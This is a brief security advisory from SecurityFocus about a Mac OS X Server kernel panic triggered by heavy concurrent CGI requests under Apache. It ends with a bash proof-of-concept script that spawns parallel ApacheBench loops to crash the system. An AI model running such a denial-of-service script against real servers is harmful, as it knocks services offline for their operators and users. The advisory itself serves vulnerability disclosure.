source: http://www.securityfocus.com/bid/306/info

A vulnerability in the MacOS X Server may crash it while under heavy load.

The vulnerability appears while stress testing a server running the Apache web server and 32 or more process are concurntly doing HTTP GET request to a CGI script in a loop. The system will panic and display a stack trace with ipc_task_init.

Although the vulnerability is not related to web servering it can only be reproduced so far using this means.


#!/bin/bash
#
# CGI-McPanic: script to crash MacOS X with 
#              concurrent calls to a CGI-Script
#
# before use, do:
# 
# chmod a+x /Local/Library/WebServer/CGI-Executables/test-cgi
#
# then call
#
# bash ./CGI-McPanic
#

NUMPROC=32
i=0

while [ $i -le $NUMPROC ]
do
    i=$[$i + 1]
    ab -t 3600 http://localhost/cgi-bin/test-cgi &
done